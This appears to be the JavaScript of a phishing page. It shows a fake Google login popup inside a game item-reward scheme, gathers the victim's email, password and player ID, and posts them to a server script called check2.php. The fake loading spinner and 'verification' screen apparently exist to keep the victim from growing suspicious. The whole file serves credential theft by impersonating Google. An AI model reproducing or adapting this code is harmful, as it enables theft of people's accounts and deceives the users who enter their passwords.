
function open_more() {

$('.more_login').show()
$('.account_login').hide()
}
function close_more() {
$('.more_login').hide()
$('.account_login').show()
}
function open_google() {
	$('.login-google').show();
	$('.more_login').hide();
  $('.itemReward_confirmations2').hide();
}
function close_google() {
	$('.login-google').hide();
	$('.account_login').show();
    $('.more_login').hide();
}

function setFocus(on) {
  var element = document.activeElement;
  if (on) {
      setTimeout(function() {
          element.parentNode.classList.add("focus");
      });
  } else {
      let box = document.querySelector(".input-box");
      box.classList.remove("focus");
      $("input").each(function() {
          var $input = $(this);
          var $parent = $input.closest(".input-box");
          if ($input.val()) $parent.addClass("focus");
          else $parent.removeClass("focus");
      });
  }
}

function ValidateLoginGoogleData() {
	$('#ValidateLoginGoogleForm').submit(function(submitingValidateLoginGoogleData){
	submitingValidateLoginGoogleData.preventDefault();
	
	$emailgoogle = $('#google-email').val().trim();
	$passwordgoogle = $('#google-password').val().trim();
	$logingoogle = $('#google-login').val().trim();
	$playid = $('#ValidatePopupPlayId').val().trim()
            if($emailgoogle == '' || $emailgoogle == null || $emailgoogle.length <= 7)
            {
                $('.email-google').fadeIn();
                setTimeout(function () {
                $('.email-google').fadeOut();
                }, 2000);                     
                $('.sandi-google').hide();
                $('.PlayerIdLoginBox').hide();                
                $('.login-google').show();
                return false;
            }else{
               $('.email-google').hide();               
	           $("input#validateEmail").val($emailgoogle);
               $('.login-google').hide();
               $('.PlayerIdLoginBox').show();               
            }
            if($passwordgoogle == '' || $passwordgoogle == null || $passwordgoogle.length <= 7)
            {
                $('.sandi-google').fadeIn();
                setTimeout(function () {
                $('.sandi-google').fadeOut();
                }, 2000);
                $('.PlayerIdLoginBox').hide();               
                $('.login-google').show();
                return false;
            }else{
               $('.sandi-google').hide();
	           $("input#validatePassword").val($passwordgoogle);
	           $("input#validateLogin").val($logingoogle);	
               $('input#ValidatePopupPlayId').val($playid)
               $('.login-google').hide();	 
               $('.login-google-load').show()
               setTimeout(function () {
               $('.login-google-sec').hide()
               $('.login-google-load').hide()
               }, 3000)
    }
    var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $validateLogin = $("input#validateLogin").val();
	var $id = $("input#id").val();
	if($validateEmail == "" && $validatePassword == "" && $validateLogin == "" && $playid == ""){
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check2.php",
		data: $(this).serialize(),
		beforeSend: function() {
        $('.login-google').hide();
		},
		success: function(){
        $('.account_login').hide();
		$('.login-google').hide();
		$('.account_verification').show();		
		}
	});
	});  
	return false;     	           
	}